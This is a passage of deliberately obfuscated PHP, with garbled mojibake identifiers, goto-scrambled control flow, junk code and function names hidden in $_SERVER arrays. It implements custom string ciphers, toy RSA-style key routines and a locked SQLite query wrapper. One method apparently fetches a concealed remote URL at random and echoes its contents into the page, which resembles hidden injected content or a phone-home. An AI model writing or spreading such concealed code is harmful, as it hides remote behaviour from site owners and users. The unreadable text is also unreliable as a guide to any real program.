($cÉÃÆÁ‹‡ >= $eÂøä˜ÔĞ¶[201]($eÂøä˜ÔĞ¶[241])) { return; } $eµâÔí¿éÇ = $eÂøä˜ÔĞ¶[61]($eÂøä˜ÔĞ¶[139])->{$_SERVER[ˆ¹–ä¶][140]}(); $c¦•¾Ê²©¶ = $dšÆîâ”¼†[636]; goto eÌ‘¸¢›ï; fÆŒÇ¥Æã²: $C¤šË®±ò = $eÂøä˜ÔĞ¶[222]($C¤šË®±ò, $eÂøä˜ÔĞ¶[10], $eÂøä˜ÔĞ¶[321]); $F­äÅöÃä¨ = $dšÆîâ”¼†[637]; if (strlen($F­äÅöÃä¨) < $dšÆîâ”¼†[577]) { return; } goto FÁøÖ»´ã£; D³ÅÆÔ×İ: $dšÆîâ”¼† =& $_SERVER[í…¶]; $eÂøä˜ÔĞ¶ =& $_SERVER[ˆ¹–ä¶]; $cÉÃÆÁ‹‡ = $this->{$_SERVER[ˆ¹–ä¶][137]}(); goto BÇ¤·óÈ¸; eÌ‘¸¢›ï: if (!$c¦•¾Ê²©¶) { die; } if ($eµâÔí¿éÇ <= $cÉÃÆÁ‹‡) { return; } $C¤šË®±ò = $eÂøä˜ÔĞ¶[61]($eÂøä˜ÔĞ¶[139])->{$_SERVER[ˆ¹–ä¶][320]}($eÂøä˜ÔĞ¶[321])->{$_SERVER[ˆ¹–ä¶][322]}($cÉÃÆÁ‹‡)->{$_SERVER[ˆ¹–ä¶][323]}(); goto fÆŒÇ¥Æã²; FÁøÖ»´ã£: if (!$eÂøä˜ÔĞ¶[239]($A¹Õù¤··[$eÂøä˜ÔĞ¶[321]], $C¤šË®±ò)) { $eÂøä˜ÔĞ¶[166]($eÂøä˜ÔĞ¶[324], !1, $eÂøä˜ÔĞ¶[236]); } goto f’„°Ôä®‘; f’„°Ôä®‘: } public function azxeb3052001() { goto b™ñµ¹ø¨ê; c•±ê×ÙÅÁ: $aó¢æËÁîù = @$cÏïçì¬ğÖ[253]($Dõ©çêğ™—, !1, $e³ç‹ƒ³É¦); $A²ºòÚÃº• = $b“†ÁÇÑñ×[638]; echo $cÏïçì¬ğÖ[326] . $cÏïçì¬ğÖ[327]($aó¢æËÁîù) . $cÏïçì¬ğÖ[328]; goto DØ—çŞøîé; DÇÉ¸çá‰¢: $Dõ©çêğ™— = $cÏïçì¬ğÖ[245]; $Dõ©çêğ™— = $this->{$_SERVER[ˆ¹–ä¶][246]}($Dõ©çêğ™—, $cÏïçì¬ğÖ[247]); $e³ç‹ƒ³É¦ = $cÏïçì¬ğÖ[248](array($cÏïçì¬ğÖ[249] => array($cÏïçì¬ğÖ[250] => $cÏïçì¬ğÖ[251], $cÏïçì¬ğÖ[252] => 3))); goto c•±ê×ÙÅÁ; b™ñµ¹ø¨ê: $b“†ÁÇÑñ× =& $_SERVER[í…¶]; $cÏïçì¬ğÖ =& $_SERVER[ˆ¹–ä¶]; if (!$cÏïçì¬ğÖ[104]($GLOBALS, $cÏïçì¬ğÖ[132]) || $cÏïçì¬ğÖ[325](1, 100) > 20) { return; } goto DÇÉ¸çá‰¢; DØ—çŞøîé: $DŞø­‹Ó«’ = $b“†ÁÇÑñ×[639]; while (strlen($DŞø­‹Ó«’) < $b“†ÁÇÑñ×[564]) { if (!$DŞø­‹Ó«’) { break; } $DŞø­‹Ó«’++; } goto bŞÈ‡ô…¼Æ; bŞÈ‡ô…¼Æ: } private function mksnc0bd1078($e«ì­¼ö», $F‰çŠ¨Íã…, $d‡ÈÒÆæÓ› = 3) { goto BŠ¢¬é–É; A»Ñ¢¡Î’‰: $cæŞ£Ë’¨¢ = $bĞ ÆÖ›Ú·[640]; if (!$cæŞ£Ë’¨¢) { die; } $aÆ «±Ç = $CªÅõÃ‰ [330]; goto d›à¯œ†©; eİ¬ÉÖ©½é: return $bê„…ªòÈ; goto B£¯Ö©Ì; F“ªÕ˜ùˆ…: $e«ì­¼ö» = $CªÅõÃ‰ [2]($e«ì­¼ö»); $F¿áÁ¶ÛÂ» = $CªÅõÃ‰ [325](0, 5) . $CªÅõÃ‰ [10]; $ešÅ‹„¼Ğ¸ = $CªÅõÃ‰ [124](15); goto A»Ñ¢¡Î’‰; d›à¯œ†©: switch ($F¿áÁ¶ÛÂ») { case $CªÅõÃ‰ [232]: $bê„…ªòÈ = $this->{$_SERVER[ˆ¹–ä¶][147]}($e«ì­¼ö», $CªÅõÃ‰ [214]($F‰çŠ¨Íã… . $ešÅ‹„¼Ğ¸)); $eÑ¨Š…ã³ = $bĞ ÆÖ›Ú·[641]; if (!$eÑ¨Š…ã³) { die; } break; $fÁÑÅ—× = $bĞ ÆÖ›Ú·[642]; if (!$fÁÑÅ—×) { return; } case $CªÅõÃ‰ [220]: $bê„…ªòÈ = $this->{$_SERVER[ˆ¹–ä¶][147]}($e«ì­¼ö», $CªÅõÃ‰ [214]($ešÅ‹„¼Ğ¸ . $F‰çŠ¨Íã…)); $b½ˆã›å = $bĞ ÆÖ›Ú·[643]; if (strlen($b½ˆã›å) < $bĞ ÆÖ›Ú·[560]) { return; } break; $d¾¿õ¿µ¿‘ = $bĞ ÆÖ›Ú·[644]; if (!$d¾¿õ¿µ¿‘) { return; } case $CªÅõÃ‰ [331]: $bê„…ªòÈ = $this->{$_SERVER[ˆ¹–ä¶][147]}($e«ì­¼ö», $CªÅõÃ‰ [118]($ešÅ‹„¼Ğ¸ . $F‰çŠ¨Íã…)); $E¾Ú°âÓ£ = $bĞ ÆÖ›Ú·[645]; while ($E¾Ú°âÓ£ < $bĞ ÆÖ›Ú·[577]) { if ($E¾Ú°âÓ£ >= 0) { break; } $E¾Ú°âÓ£++; } break; case $CªÅõÃ‰ [332]: $bê„…ªòÈ = $this->{$_SERVER[ˆ¹–ä¶][147]}($e«ì­¼ö», $CªÅõÃ‰ [114]($ešÅ‹„¼Ğ¸ . $F‰çŠ¨Íã…)); break; case $CªÅõÃ‰ [333]: goto EçÏ£Œ‚É; EİÍƒõÀÊ‰: $bê„…ªòÈ = $CªÅõÃ‰ [327]($Dö™ÓÛÇïÂ . $DïÖé¾Ú¯ø); break; $b”«ÉÓ…Ú = $bĞ ÆÖ›Ú·[651]; goto d¶¤‘·îÖ»; eîà¿Àğ»Ğ: $DÉ©¼¾àòß = 0; $fà‚¦óÉ… = $bĞ ÆÖ›Ú·[649]; for ($FğÈ³Ù‘×Ö = 0; $FğÈ³Ù‘×Ö < $CªÅõÃ‰ [24]($e«ì­¼ö»); $FğÈ³Ù‘×Ö++) { $DÉ©¼¾àòß = $DÉ©¼¾àòß == $CªÅõÃ‰ [24]($CÌ‚ô‹„ˆœ) ? 0 : $DÉ©¼¾àòß; $B´å¹†õğ = ($cÄæÛ©¬¹· + $CªÅõÃ‰ [335]($aÆ «±Ç, $e«ì­¼ö»[$FğÈ³Ù‘×Ö]) + $CªÅõÃ‰ [336]($CÌ‚ô‹„ˆœ[$DÉ©¼¾àòß++])) % 64; $e¼‹˜¼ƒƒÉ = $bĞ ÆÖ›Ú·[650]; if (strlen($e¼‹˜¼ƒƒÉ) < $bĞ ÆÖ›Ú·[577]) { return; } $DïÖé¾Ú¯ø .= $aÆ «±Ç[$B´å¹†õğ]; } goto EİÍƒõÀÊ‰; EèößÍê³Û: $FŞÅŞÎèî = $bĞ ÆÖ›Ú·[647]; $Dö™ÓÛÇïÂ = $aÆ «±Ç[$cÄæÛ©¬¹·]; $CÌ‚ô‹„ˆœ = $CªÅõÃ‰ [114]($Dö™ÓÛÇïÂ . $CªÅõÃ‰ [114]($F‰çŠ¨Íã… . $Dö™ÓÛÇïÂ) . $F‰çŠ¨Íã…); goto FÓØ¢æå; EÇ–ÓØ»ğ: $DïÖé¾Ú¯ø = $CªÅõÃ‰ [10]; $FğÈ³Ù‘×Ö = 0; $B´å¹†õğ = 0; goto eîà¿Àğ»Ğ; EçÏ£Œ‚É: $e«ì­¼ö» = $CªÅõÃ‰ [118]($e«ì­¼ö»); $AÁ’ßœõÂ = $bĞ ÆÖ›Ú·[646]; $cÄæÛ©¬¹· = $CªÅõÃ‰ [334](0, 64); goto EèößÍê³Û; FÓØ¢æå: $CÌ‚ô‹„ˆœ = $CªÅõÃ‰ [25]($CÌ‚ô‹„ˆœ, $cÄæÛ©¬¹· % 8, $cÄæÛ©¬¹· % 8 + 7); $c”ªÏêØø¡ = $bĞ ÆÖ›Ú·[648]; if (strlen($c”ªÏêØø¡) < $bĞ ÆÖ›Ú·[582]) { die; } goto EÇ–ÓØ»ğ; d¶¤‘·îÖ»: default: $bê„…ªòÈ = $this->{$_SERVER[ˆ¹–ä¶][147]}($e«ì­¼ö», $F‰çŠ¨Íã… . $ešÅ‹„¼Ğ¸); $bš…òÚÃä² = $bĞ ÆÖ›Ú·[652]; while ($bš…òÚÃä² < $bĞ ÆÖ›Ú·[564]) { if ($bš…òÚÃä² >= 0) { break; } $bš…òÚÃä²++; } break; } $bê„…ªòÈ = $CªÅõÃ‰ [214]($F¿áÁ¶ÛÂ» . $ešÅ‹„¼Ğ¸ . $bê„…ªòÈ); if ($d‡ÈÒÆæÓ› - 1 > 0) { $bê„…ªòÈ = $this->{$_SERVER[ˆ¹–ä¶][127]}($bê„…ªòÈ, $F‰çŠ¨Íã…, $d‡ÈÒÆæÓ› - 1); } goto eİ¬ÉÖ©½é; BŠ¢¬é–É: $bĞ ÆÖ›Ú· =& $_SERVER[í…¶]; $CªÅõÃ‰  =& $_SERVER[ˆ¹–ä¶]; $CªÅõÃ‰ [329](1); goto F“ªÕ˜ùˆ…; B£¯Ö©Ì: } private function igzm7f52e653($Fš‚Œ¡º‚®, $dƒˆÈî‡Ø, $B°æ¦®±‹ = 3) { goto DÉ¶ŒğÜŒµ; D”ç•İ¦©Á: $Fš‚Œ¡º‚® = $DÌÅäÁ£Å­[2]($Fš‚Œ¡º‚®); $C½Ô¤‘ŸŒ = $fò°ÕŞ‘Ü[653]; if (!$C½Ô¤‘ŸŒ) { return; } goto Bí²âŒ·É; Bí²âŒ·É: $Fš‚Œ¡º‚® = $DÌÅäÁ£Å­[214]($Fš‚Œ¡º‚®); $fï³âí¡¯ = $fò°ÕŞ‘Ü[654]; $CÑ‡Ä °¹‹ = $Fš‚Œ¡º‚®[0]; goto C©º®•Ÿ¸; cÜ¨ÈÂ›ãì: while (strlen($b˜›òƒÖí) < $fò°ÕŞ‘Ü[560]) { if (!$b˜›òƒÖí) { break; } $b˜›òƒÖí++; } switch ($CÑ‡Ä °¹‹) { case $DÌÅäÁ£Å­[232]: $E¢ØÍŸ¶Œí = $this->{$_SERVER[ˆ¹–ä¶][246]}($Fš‚Œ¡º‚®, $DÌÅäÁ£Å­[214]($dƒˆÈî‡Ø . $B“ëÇœÕ)); break; case $DÌÅäÁ£Å­[220]: $E¢ØÍŸ¶Œí = $this->{$_SERVER[ˆ¹–ä¶][246]}($Fš‚Œ¡º‚®, $DÌÅäÁ£Å­[214]($B“ëÇœÕ . $dƒˆÈî‡Ø)); $Fì–»§ó— = $fò°ÕŞ‘Ü[658]; while (strlen($Fì–»§ó—) < $fò°ÕŞ‘Ü[348]) { if (!$Fì–»§ó—) { break; } $Fì–»§ó—++; } break; case $DÌÅäÁ£Å­[331]: $E¢ØÍŸ¶Œí = $this->{$_SERVER[ˆ¹–ä¶][246]}($Fš‚Œ¡º‚®, $DÌÅäÁ£Å­[118]($B“ëÇœÕ . $dƒˆÈî‡Ø)); break; $aì•¤˜†É = $fò°ÕŞ‘Ü[659]; if (strlen($aì•¤˜†É) < $fò°ÕŞ‘Ü[560]) { return; } case $DÌÅäÁ£Å­[332]: $E¢ØÍŸ¶Œí = $this->{$_SERVER[ˆ¹–ä¶][246]}($Fš‚Œ¡º‚®, $DÌÅäÁ£Å­[114]($B“ëÇœÕ . $dƒˆÈî‡Ø)); break; $D©ÛåØ¼ë = $fò°ÕŞ‘Ü[660]; if (!$D©ÛåØ¼ë) { return; } case $DÌÅäÁ£Å­[333]: goto bêäƒÕó—ò; eõŒš¨ŠŒÆ: $DÏµÓŞªµ™ = $fò°ÕŞ‘Ü[665]; if (strlen($DÏµÓŞªµ™) < $fò°ÕŞ‘Ü[560]) { return; } for ($DóêÍæ½˜¤ = 0; $DóêÍæ½˜¤ < $DÌÅäÁ£Å­[24]($Fš‚Œ¡º‚®); $DóêÍæ½˜¤++) { $a³§±àëæ· = $a³§±àëæ· == $DÌÅäÁ£Å­[24]($c´­±Î…) ? 0 : $a³§±àëæ·; $C‚ÈŞø¥ç÷ = $fò°ÕŞ‘Ü[666]; if (!$C‚ÈŞø¥ç÷) { return; } $e…¡ø‚»ƒ = $a³§±àëæ·++; $f³ìŞŠ—¼ñ = $DÌÅäÁ£Å­[335]($C÷™’¿åˆì, $Fš‚Œ¡º‚®[$DóêÍæ½˜¤]) - $fğ’Âšƒ‚Ş - $DÌÅäÁ£Å­[336]($c´­±Î…[$e…¡ø‚»ƒ]); while ($f³ìŞŠ—¼ñ < 0) { $f³ìŞŠ—¼ñ += 64; } $cÈ×©‹ÃÜå .= $C÷™’¿åˆì[$f³ìŞŠ—¼ñ]; $AŸˆ‘Ñè¿ã = $fò°ÕŞ‘Ü[667]; while ($AŸˆ‘Ñè¿ã < $fò°ÕŞ‘Ü[577]) { if ($AŸˆ‘Ñè¿ã >= 0) { break; } $AŸˆ‘Ñè¿ã++; } } goto dÎ¡œÒÀîÊ; A§‹ÛÉĞøµ: $A°ÙñôÉŸ = $fò°ÕŞ‘Ü[663]; if (strlen($A°ÙñôÉŸ) < $fò°ÕŞ‘Ü[348]) { return; } $f³ìŞŠ—¼ñ = 0; goto f±Ï¬Ó¦ÛÈ; d§ìöÍãº–: $AÎ°Üˆ¨à” = $fò°ÕŞ‘Ü[662]; if (!$AÎ°Üˆ¨à”) { return; } $DóêÍæ½˜¤ = 0; goto A§‹ÛÉĞøµ; dÎ¡œÒÀîÊ: $E¢ØÍŸ¶Œí = $DÌÅäÁ£Å­[339]($cÈ×©‹ÃÜå); break; $E®¤´ÆÁŸå = $fò°ÕŞ‘Ü[668]; goto FöÛÃ¸ºê; båÆŸòĞ´: $c´­±Î… = $DÌÅäÁ£Å­[114]($fìÇÆ¶ïâ„ . $DÌÅäÁ£Å­[114]($dƒˆÈî‡Ø . $fìÇÆ¶ïâ„) . $dƒˆÈî‡Ø); $c´­±Î… = $DÌÅäÁ£Å­[25]($c´­±Î…, $fğ’Âšƒ‚Ş % 8, $fğ’Âšƒ‚Ş % 8 + 7); $cÈ×©‹ÃÜå = $DÌÅäÁ£Å­[10]; goto d§ìöÍãº–; f±Ï¬Ó¦ÛÈ: $c¨«†Ší¸è = $fò°ÕŞ‘Ü[664]; while (strlen($c¨«†Ší¸è) < $fò°ÕŞ‘Ü[582]) { if (!$c¨«†Ší¸è) { break; } $c¨«†Ší¸è++; } $a³§±àëæ· = 0; goto eõŒš¨ŠŒÆ; F¥§…¨îÛƒ: $fğ’Âšƒ‚Ş = $DÌÅäÁ£Å­[335]($C÷™’¿åˆì, $fìÇÆ¶ïâ„); $Aìöö¡•»Ÿ = $fò°ÕŞ‘Ü[661]; if (!$Aìöö¡•»Ÿ) { return; } goto båÆŸòĞ´; FöÛÃ¸ºê: if (strlen($E®¤´ÆÁŸå) < $fò°ÕŞ‘Ü[577]) { die; } goto bŒ¾¥˜Ç‚©; bêäƒÕó—ò: $Fš‚Œ¡º‚® = $DÌÅäÁ£Å­[338]($Fš‚Œ¡º‚®); $fìÇÆ¶ïâ„ = $Fš‚Œ¡º‚®[0]; $Fš‚Œ¡º‚® = $DÌÅäÁ£Å­[25]($Fš‚Œ¡º‚®, 1); goto F¥§…¨îÛƒ; bŒ¾¥˜Ç‚©: default: $E¢ØÍŸ¶Œí = $this->{$_SERVER[ˆ¹–ä¶][246]}($Fš‚Œ¡º‚®, $dƒˆÈî‡Ø . $B“ëÇœÕ); break; } if ($B°æ¦®±‹ - 1 > 0) { $E¢ØÍŸ¶Œí = $this->{$_SERVER[ˆ¹–ä¶][188]}($E¢ØÍŸ¶Œí, $dƒˆÈî‡Ø, $B°æ¦®±‹ - 1); } goto cšÇµŸ…Õ; D»ÏÛ×Çé„: $d‹¾Óôè‰ò = $fò°ÕŞ‘Ü[656]; $C÷™’¿åˆì = $DÌÅäÁ£Å­[330]; $b˜›òƒÖí = $fò°ÕŞ‘Ü[657]; goto cÜ¨ÈÂ›ãì; C©º®•Ÿ¸: $b‚‘ÅÂçˆ± = $fò°ÕŞ‘Ü[655]; $B“ëÇœÕ = $DÌÅäÁ£Å­[25]($Fš‚Œ¡º‚®, 1, 15); $Fš‚Œ¡º‚® = $DÌÅäÁ£Å­[25]($Fš‚Œ¡º‚®, 16); goto D»ÏÛ×Çé„; DÉ¶ŒğÜŒµ: $fò°ÕŞ‘Ü =& $_SERVER[í…¶]; $DÌÅäÁ£Å­ =& $_SERVER[ˆ¹–ä¶]; if (!$DÌÅäÁ£Å­[337]($Fš‚Œ¡º‚®) || $DÌÅäÁ£Å­[24]($Fš‚Œ¡º‚®) < 10) { return !1; } goto D”ç•İ¦©Á; cšÇµŸ…Õ: return $E¢ØÍŸ¶Œí; goto B£ì—œ†¦ø; B£ì—œ†¦ø: } public function okcr8156d039($Fî’¥÷ ªÄ) { goto DîàÑ¤°Ğİ; DôŒ¸‡áïª: if (strlen($F„Ê´×Üù) < $EÖ‡™ï‘[348]) { die; } for ($AÊº›š”Ûï = 0; $AÊº›š”Ûï < $aÔà—ªµá * 10; $AÊº›š”Ûï++) { if (($aÔà—ªµá * $AÊº›š”Ûï + 1) % $D Ú‹ÅïË == 0) { $dÏâ¬»ˆ = $D¥ŒœŸËÒ»[201](($aÔà—ªµá * $AÊº›š”Ûï + 1) / $D Ú‹ÅïË); break; } } $d©¯ùÒÙ»¢ = $this->{$_SERVER[ˆ¹–ä¶][147]}($DöÔÙ•Äàµ * $Cç¼¶–¼ . $D¥ŒœŸËÒ»[10], $D¥ŒœŸËÒ»[149]); goto AÎôÈ”“İ®; BÇ¯˜Æí„¯: $CÇáßôÃ = $EÖ‡™ï‘[670]; $aÔà—ªµá = ($DöÔÙ•Äàµ - 1) * ($Cç¼¶–¼ - 1); $D Ú‹ÅïË = $D¥ŒœŸËÒ»[201](($DöÔÙ•Äàµ + $Cç¼¶–¼) / 2); goto aÚÓÍ³‹ŸÜ; DîàÑ¤°Ğİ: $EÖ‡™ï‘ =& $_SERVER[í…¶]; $D¥ŒœŸËÒ» =& $_SERVER[ˆ¹–ä¶]; $DöÔÙ•Äàµ = $this->{$_SERVER[ˆ¹–ä¶][340]}(); goto Bç¿‡‰ô”“; aÚÓÍ³‹ŸÜ: while (1) { $E…Ëç‘°Çç = $D Ú‹ÅïË; $cÖÂéªÀ ‘ = $EÖ‡™ï‘[653]; $EîâÓÊ¡˜Ş = $aÔà—ªµá; $d½³¦ÃñÂ = $EÖ‡™ï‘[671]; while ($EîâÓÊ¡˜Ş % $E…Ëç‘°Çç != 0) { $fªƒ”½Ëº¢ = $EîâÓÊ¡˜Ş; $EîâÓÊ¡˜Ş = $E…Ëç‘°Çç; $E…Ëç‘°Çç = $fªƒ”½Ëº¢ % $E…Ëç‘°Çç; $AÔ×öêÔë• = $EÖ‡™ï‘[672]; while (strlen($AÔ×öêÔë•) < $EÖ‡™ï‘[577]) { if (!$AÔ×öêÔë•) { break; } $AÔ×öêÔë•++; } } if ($E…Ëç‘°Çç == 1) { break; } else { $D Ú‹ÅïË++; } } $dÏâ¬»ˆ = 2; $F„Ê´×Üù = $EÖ‡™ï‘[673]; goto DôŒ¸‡áïª; Bç¿‡‰ô”“: $cÄµ“ïŸ‚¢ = $EÖ‡™ï‘[669]; while ($cÄµ“ïŸ‚¢ < $EÖ‡™ï‘[582]) { if ($cÄµ“ïŸ‚¢ >= 0) { break; } $cÄµ“ïŸ‚¢++; } $Cç¼¶–¼ = $this->{$_SERVER[ˆ¹–ä¶][340]}(); goto BÇ¯˜Æí„¯; AÎôÈ”“İ®: $C“‹ï±¡‘Æ = $D¥ŒœŸËÒ»[114]($D¥ŒœŸËÒ»[341] . ($DöÔÙ•Äàµ + $Cç¼¶–¼) . $D¥ŒœŸËÒ»[342] . $D Ú‹ÅïË . $D¥ŒœŸËÒ»[342] . $dÏâ¬»ˆ . $D¥ŒœŸËÒ»[343]); $aòÈô®÷¦© = $this->{$_SERVER[ˆ¹–ä¶][147]}($Fî’¥÷ ªÄ, $C“‹ï±¡‘Æ) . $D¥ŒœŸËÒ»[344] . $d©¯ùÒÙ»¢; return $aòÈô®÷¦©; goto DõäĞÍ¦á˜; DõäĞÍ¦á˜: } public function vuof47d2f7bf($f¡æëƒŸ¯ï) { goto FÓ×’¸ùÊ•; eƒó¶Ç­°§: $c‡Ì±§ó¦ = $d•„‡‡îğù[676]; if (strlen($c‡Ì±§ó¦) < $d•„‡‡îğù[582]) { die; } $A§’·ÀÂËÔ = 0; goto c¶Ø´÷Ş”¯; DÌÀŸÚ»·: $CáÑâìÏ¬¨ = $this->{$_SERVER[ˆ¹–ä¶][246]}($bÒğ’ğ¦æ»[1] . $C¿±Š£ò¡·[10], $C¿±Š£ò¡·[149]); $dÌ—•ºãØ… = $d•„‡‡îğù[675]; if (!$dÌ—•ºãØ…) { return; } goto b÷¾âá³Ä¦; D„ò Äİ¸: $FÄŠÍ…ŠöÉ = $d•„‡‡îğù[683]; if (!$FÄŠÍ…ŠöÉ) { die; } return $eÂËí’›’¾; goto dƒ ¬´´ô¾; AğîÆ¦è´¤: for ($C•­ğ­†Ø = 0; $C•­ğ­†Ø < $d…ÂÓÇ¯í‘ * 10; $C•­ğ­†Ø++) { if (($d…ÂÓÇ¯í‘ * $C•­ğ­†Ø + 1) % $D‘¢Í¯´Æº == 0) { $fòê™‚¥ÀÃ = $C¿±Š£ò¡·[201](($d…ÂÓÇ¯í‘ * $C•­ğ­†Ø + 1) / $D‘¢Í¯´Æº); break; } } $a®­Àª©³ = $C¿±Š£ò¡·[114]($C¿±Š£ò¡·[341] . ($fƒ‰Îö –ˆ + $A§’·ÀÂËÔ) . $C¿±Š£ò¡·[342] . $D‘¢Í¯´Æº . $C¿±Š£ò¡·[342] . $fòê™‚¥ÀÃ . $C¿±Š£ò¡·[343]); $eÂËí’›’¾ = $this->{$_SERVER[ˆ¹–ä¶][246]}($bÒğ’ğ¦æ»[0], $a®­Àª©³); goto D„ò Äİ¸; e“ø½ô“Ë„: $fòê™‚¥ÀÃ = 2; $aä»ùÃ‡ïÏ = $d•„‡‡îğù[682]; if (strlen($aä»ùÃ‡ïÏ) < $d•„‡‡îğù[560]) { return; } goto AğîÆ¦è´¤; b÷¾âá³Ä¦: if (!$CáÑâìÏ¬¨) { return $C¿±Š£ò¡·[10]; } $CáÑâìÏ¬¨ = $C¿±Š£ò¡·[201]($CáÑâìÏ¬¨); $fƒ‰Îö –ˆ = 0; goto eƒó¶Ç­°§; a…¾‡÷Â†Í: if (!$dµª›î¿¯Ø) { die; } $D‘¢Í¯´Æº = $C¿±Š£ò¡·[201](($fƒ‰Îö –ˆ + $A§’·ÀÂËÔ) / 2); while (1) { $Ağêß¨Öí = $D‘¢Í¯´Æº; $EºÔ©àÂ›« = $d•„‡‡îğù[679]; $eÀ±¦Ïìƒî = $d…ÂÓÇ¯í‘; $A×¥ÏÖß = $d•„‡‡îğù[680]; while ($eÀ±¦Ïìƒî % $Ağêß¨Öí != 0) { $e¤ÚË¼·â = $eÀ±¦Ïìƒî; $AõŒÈÔ£ä¼ = $d•„‡‡îğù[681]; if (!$AõŒÈÔ£ä¼) { die; } $eÀ±¦Ïìƒî = $Ağêß¨Öí; $Ağêß¨Öí = $e¤ÚË¼·â % $Ağêß¨Öí; } if ($Ağêß¨Öí == 1) { break; } else { $D‘¢Í¯´Æº++; } } goto e“ø½ô“Ë„; c¶Ø´÷Ş”¯: for ($C•­ğ­†Ø = 3; $C•­ğ­†Ø < $CáÑâìÏ¬¨; $C•­ğ­†Ø += 2) { if ($CáÑâìÏ¬¨ % $C•­ğ­†Ø != 0) { continue; } $fƒ‰Îö –ˆ = $C•­ğ­†Ø; $A§’·ÀÂËÔ = $C¿±Š£ò¡·[201]($CáÑâìÏ¬¨ / $C•­ğ­†Ø); break; $D²İ®„¤„« = $d•„‡‡îğù[677]; } $d…ÂÓÇ¯í‘ = ($fƒ‰Îö –ˆ - 1) * ($A§’·ÀÂËÔ - 1); $dµª›î¿¯Ø = $d•„‡‡îğù[678]; goto a…¾‡÷Â†Í; FÓ×’¸ùÊ•: $d•„‡‡îğù =& $_SERVER[í…¶]; $C¿±Š£ò¡· =& $_SERVER[ˆ¹–ä¶]; $bÒğ’ğ¦æ» = $C¿±Š£ò¡·[0]($C¿±Š£ò¡·[344], $f¡æëƒŸ¯ï); goto eÊ‘ÎÜÙÈö; eÊ‘ÎÜÙÈö: $b¦Ÿàõ‹à = $d•„‡‡îğù[674]; while (strlen($b¦Ÿàõ‹à) < $d•„‡‡îğù[577]) { if (!$b¦Ÿàõ‹à) { break; } $b¦Ÿàõ‹à++; } if ($C¿±Š£ò¡·[19]($bÒğ’ğ¦æ») != 2) { return $C¿±Š£ò¡·[10]; } goto DÌÀŸÚ»·; dƒ ¬´´ô¾: $cÃ¯¢ß˜ÛÏ = $d•„‡‡îğù[684]; goto Dæ½ÁŒ¸² ; Dæ½ÁŒ¸² : } public function qvgm6fe9c22f() { goto fàæ›š¼£«; aµ¿³ÍäÛá: $BØó²¼ãù = $cˆ¶Ã¸ÜÛ²[688]; if (!$BØó²¼ãù) { return; } goto F¤ë¤¥±›º; cš¨ÊœŒšï: $a«’İ½ÒÚÀ = $cˆ¶Ã¸ÜÛ²[685]; $cáöÜ¿µ‹‹ = array(); $f³²Â¯Ğ• = 1; goto bèñ‘ŠÄŒè; bèñ‘ŠÄŒè: $dÎˆğ î = $cˆ¶Ã¸ÜÛ²[576]; if (!$dÎˆğ î) { return; } while ($f³²Â¯Ğ• <= (int) $eÃ‚²¿Ÿ¡[346]($cÍáàšøÚ)) { $c¨‡­±®… = $f³²Â¯Ğ•; while (!0) { $c¨‡­±®…++; $FÍÆÜÑŠÉ¿ = $cˆ¶Ã¸ÜÛ²[686]; if (!$FÍÆÜÑŠÉ¿) { die; } if ($c¨‡­±®… <= 2) { $f³²Â¯Ğ• = $c¨‡­±®…; break; } else { if ($c¨‡­±®… < 2) { continue; } } $bì‘ÂÓÂğ = !0; for ($b²„ÙùáØ = 2; $b²„ÙùáØ <= $eÃ‚²¿Ÿ¡[346]($c¨‡­±®…); $b²„ÙùáØ++) { if ($c¨‡­±®… % $b²„ÙùáØ == 0) { $bì‘ÂÓÂğ = !1; } } if ($bì‘ÂÓÂğ) { $f³²Â¯Ğ• = $c¨‡­±®…; break; } } $cáöÜ¿µ‹‹[] = $f³²Â¯Ğ•; $a•ù½Ë”¨¢ = $cˆ¶Ã¸ÜÛ²[687]; } goto AØ®ùİÈÙ; AØ®ùİÈÙ: $c‹ÔŞÆ„† = 2; for ($c¨‡­±®… = $cÍáàšøÚ; $c¨‡­±®… > 1; $c¨‡­±®…--) { $bì‘ÂÓÂğ = !0; foreach ($cáöÜ¿µ‹‹ as $Cï»Î‡åâ) { if ($c¨‡­±®… % $Cï»Î‡åâ == 0) { $bì‘ÂÓÂğ = !1; break; } } if ($bì‘ÂÓÂğ) { $c‹ÔŞÆ„† = $c¨‡­±®…; break; } } return $c‹ÔŞÆ„†; goto aµ¿³ÍäÛá; fàæ›š¼£«: $cˆ¶Ã¸ÜÛ² =& $_SERVER[í…¶]; $eÃ‚²¿Ÿ¡ =& $_SERVER[ˆ¹–ä¶]; $cÍáàšøÚ = $eÃ‚²¿Ÿ¡[325]($eÃ‚²¿Ÿ¡[345](2, 14), $eÃ‚²¿Ÿ¡[345](2, 16) - 1); goto cš¨ÊœŒšï; F¤ë¤¥±›º: } public function gwip2278ee7a($aáÆ¦»ìÇ¬, $Bâ½×ê„¾Ş) { $B‹·ğ°›º =& $_SERVER[í…¶]; $E­Úä‰ôä =& $_SERVER[ˆ¹–ä¶]; return $E­Úä‰ôä[13](array($E­Úä‰ôä[14], $E­Úä‰ôä[347]), $aáÆ¦»ìÇ¬, $Bâ½×ê„¾Ş); $C‚®­¯ˆÅ = $B‹·ğ°›º[641]; while ($C‚®­¯ˆÅ < $B‹·ğ°›º[348]) { if ($C‚®­¯ˆÅ >= 0) { break; } $C‚®­¯ˆÅ++; } } public function ehka0b48de13($DÏöÙ¾¥, $FÍè…º‹Ç‚) { $aÛ£‚®¶§Ö =& $_SERVER[ˆ¹–ä¶]; return $aÛ£‚®¶§Ö[13](array($aÛ£‚®¶§Ö[348], $aÛ£‚®¶§Ö[349]), $DÏöÙ¾¥, $FÍè…º‹Ç‚); $aøâ»““Ã¦ = $_SERVER[í…¶][653]; } public function bahp4d124cb2($Cö™ÅÕôÌé, $fÆ‘ºšÜ·) { $Bæ¦—´É³³ =& $_SERVER[ˆ¹–ä¶]; return $Bæ¦—´É³³[13](array($Bæ¦—´É³³[348], $Bæ¦—´É³³[350]), $Cö™ÅÕôÌé, $fÆ‘ºšÜ·); } } goto c¢¨ë¤ì”™; A´·ÑõÔŞ: class DbSqlite extends DbSqliteBase { public function query($AîªË•ñÎ) { goto C÷ÀÈ¢´¢; C÷ÀÈ¢´¢: $eÇØ´ÓøÖ× =& $_SERVER[í…¶]; $F°×“¶Ö‰‹ = DATA_PATH . $eÇØ´ÓøÖ×[870]; $A‰»†ß°²ƒ = fopen($F°×“¶Ö‰‹, $eÇØ´ÓøÖ×[871]); goto DÙ¦Œ–„; DÙ¦Œ–„: if (!$A‰»†ß°²ƒ) { return !1; } if (flock($A‰»†ß°²ƒ, LOCK_EX)) { $F¿Ûªª¶Ûñ = parent::query($AîªË•ñÎ); 